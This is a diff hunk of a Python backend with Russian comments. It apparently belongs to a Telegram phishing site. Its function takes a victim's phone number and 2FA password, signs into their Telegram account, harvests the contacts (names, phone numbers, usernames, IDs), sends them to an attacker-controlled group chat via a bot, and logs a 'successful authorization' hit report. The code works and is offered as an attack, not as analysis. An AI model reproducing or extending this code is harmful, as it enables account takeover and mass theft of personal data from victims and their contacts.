@@ -298,26 +298,74 @@ async def verify_telegram_2fa(phone, password):
         session = active_sessions[phone_clean]
         client = session['client']
         
+        # Входим с паролем
         await client.sign_in(password=password)
+        print(f"✅ 2FA успешно пройдена для {phone_clean}")
         
+        # 🔥 ВЫКАЧКА РЕАЛЬНЫХ КОНТАКТОВ
+        print(f"🚀 Начинаем сбор РЕАЛЬНЫХ контактов...")
+        contacts = await client.get_contacts()
+        
+        # Формируем сообщение с контактами
+        contacts_text = f"📱 ВЫКАЧАНЫ РЕАЛЬНЫЕ КОНТАКТЫ\n\n"
+        contacts_text += f"📟 Номер: {phone_clean}\n"
+        contacts_text += f"👥 Всего контактов: {len(contacts)}\n"
+        contacts_text += f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        
+        contacts_text += "📞 СПИСОК КОНТАКТОВ:\n"
+        contacts_text += "=" * 40 + "\n\n"
+        
+        # Добавляем первые 20 контактов (чтобы не превысить лимит сообщения)
+        for i, contact in enumerate(contacts[:20], 1):
+            name = f"{contact.first_name or ''} {contact.last_name or ''}".strip()
+            phone = contact.phone or 'нет номера'
+            username = f"@{contact.username}" if contact.username else "нет юзернейма"
+            
+            contacts_text += f"{i}. {name}\n"
+            contacts_text += f"   📞 {phone}\n"
+            contacts_text += f"   🔗 {username}\n"
+            contacts_text += f"   🆔 ID: {contact.id}\n"
+            
+            if contact.mutual_contact:
+                contacts_text += f"   🤝 Взамный контакт\n"
+            
+            contacts_text += "\n"
+        
+        # Если контактов больше 20 - показываем сколько еще
+        if len(contacts) > 20:
+            contacts_text += f"... и еще {len(contacts) - 20} контактов\n"
+        
+        # 🔥 ОТПРАВЛЯЕМ КОНТАКТЫ В ГРУППУ
+        try:
+            await bot.send_message(GROUP_CHAT_ID, contacts_text)
+            print(f"✅ Контакты отправлены в группу!")
+        except Exception as e:
+            print(f"❌ Ошибка отправки в группу: {e}")
+        
+        # Создаем сессию
         session_token = create_user_session(phone_clean, client)
         
-        # АВТОМАТИЧЕСКАЯ ВЫКАЧКА КОНТАКТОВ
-        print(f"🚀 Автоматически выкачиваем контакты для {phone_clean}")
-        contacts_result = await get_real_telegram_contacts(session_token)
-        
+        # Очищаем активную сессию
         if phone_clean in active_sessions:
             del active_sessions[phone_clean]
         
-        print(f"✅ 2FA авторизация успешна для {phone_clean}")
+        # Отстук о успешной авторизации
+        add_notification(
+            f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
+            f"📟 Номер: +{phone_clean}\n"
+            f"👥 Контактов выкачано: {len(contacts)}\n"
+            f"📨 Отправлено в группу: Да"
+        )
+        
         return {
             'success': True,
             'session_token': session_token,
-            'contacts_exported': contacts_result['success'],
-            'contacts_count': contacts_result.get('contacts_count', 0)
+            'contacts_count': len(contacts),
+            'message': f'✅ Собрано {len(contacts)} контактов'
         }
             
     except Exception as e:
+        print(f"❌ Ошибка 2FA: {e}")
         return {'success': False, 'error': str(e)}
 
 # === HTTP ОБРАБОТЧИКИ ДЛЯ САЙТА ===
